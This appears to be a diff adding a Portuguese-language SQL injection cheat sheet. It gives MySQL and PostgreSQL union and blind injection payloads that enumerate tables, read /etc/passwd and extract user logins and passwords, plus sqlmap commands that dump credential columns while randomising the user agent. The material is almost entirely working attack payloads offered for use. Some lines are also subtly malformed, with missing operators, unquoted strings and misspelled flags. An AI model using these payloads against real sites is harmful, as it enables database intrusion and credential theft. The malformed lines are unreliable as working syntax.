@@ -1,0 +1,75 @@
+POST: usuario ' or 1 = 1 limit 1;#
+GET: -1 order by 4 #Tentar identificar o numero de colunas ate dar erro 
+GET: -1 union select 1,version(),3,4
+GET: -1 union select 1,concat(user,':',password),3,4 from users;
+
+#Blind SQL - Logica boolean (Verdadeiro ou Falso)
+GET: 1 ' 1=1#
+#Identificar quantidade de colunas (Quando a aplicaç~~ao nao trouxer resposta, estoura a quantidade de colunas)
+GET: 1 ' 1=1 order by 1 #
+GET: 1 ' 1=1 union select 1,2 #
+#Testando injeç~~ao
+GET: 1 ' 1=1 union select test,vuln #
+GET: 1 ' 1=1 union select version(),database() #
+#Testando acesso a arquivos do banco para o S.O
+GET: 1 ' 1=1 union select load_file(/etc/passwd),2 #
+
+#Decobrindo user e senha (Descobrir tabela de login, user, ou algo do tipo - No caso o nome da tabela sera users) 
+GET: 1 ' 1=1 union select 1,table_name from information_schema.tables #
+GET: 1 ' 1=1 union select 1,column_name from information_schema.columns where table_name='users' #
+#Coletando o usuario e senha
+GET: 1 ' 1=1 union select user,password from users #
+
+
+POSTGREQL
+#Testando em url com metodo get
+GET: page.php?id=1'
+GET: page.php?id=1' order by 2
+#Identificar quantidade de colunas aten~~ao exibir erro
+GET: page.php?id=-1' union select null,null
+#Tentar interagir com o banco (Adicionar aspas simples na coluna, ate nao retornar erro)
+GET: page.php?id=-1' union select 'null',null
+GET: page.php?id=-1' union select null,'null'
+#Tentar executar comando sql na  cokuna vulneravel:
+GET: page.php?id=-1' union select null,version()
+GET: page.php?id=-1' union select null,datname from pg_database;
+GET: page.php?id=-1' union select null,tablename from pg_tables 
+#Identificando tabelas do database alvo (Identificar tabela de login, ou usuarios)
+GET: page.php?id=-1' union select null,table_name from information_schema.table where pg_catalog='database';
+#Identificar colunas da tabela alvo
+
+GET: page.php?id=-1' union select null,column_name from information_schema.columns where table_name='users';
+
+#Coletando os logins (Identificada coluna login):
+GET: page.php?id=-1' union select null,login from users;
+GET: page.php?id=-1' union select null,password from users;
+#Concatenando login:senha
+GET: page.php?id=-1' union select null,login||:||password from users;
+
+
+SQLMAP - Automatizaçao - GET
+SQLMAP - Automatizaçao - POST (Informar o parametro --form ou o --data="campo=")
+
+sqlmap -u "http://$url/page.php?id=1" --dbs
+#--dbs = Verifica todos os bancos de dados
+
+
+sqlmap -u "http://$url/page.php?id=1" --current-db --dbms=mysql --randon-agent
+#--current-db = Identifica o banco de dados usado na aplicaçao
+#--dbms = seleciona o tipo do banco
+#--randon-agent = Muda o user agent do sqlmap
+
+
+sqlmap -u "http://$url/page.php?id=1" -D database --dbms=mysql --randon-agent --tables
+#-D = Informa o banco de dados que ira verificar
+#--tables = Tenta identificar as tabelas do banco
+
+
+sqlmap -u "http://$url/page.php?id=1" -D database --dbms=mysql --randon-agent -T users --columns
+#-T = Tenta identificar colunas da tabela users 
+
+
+sqlmap -u "http://$url/page.php?id=1" -D database --dbms=mysql --randon-agent -T users -C 'login,password' --dump
+#-C = Informa as colunas da tabela
+
+
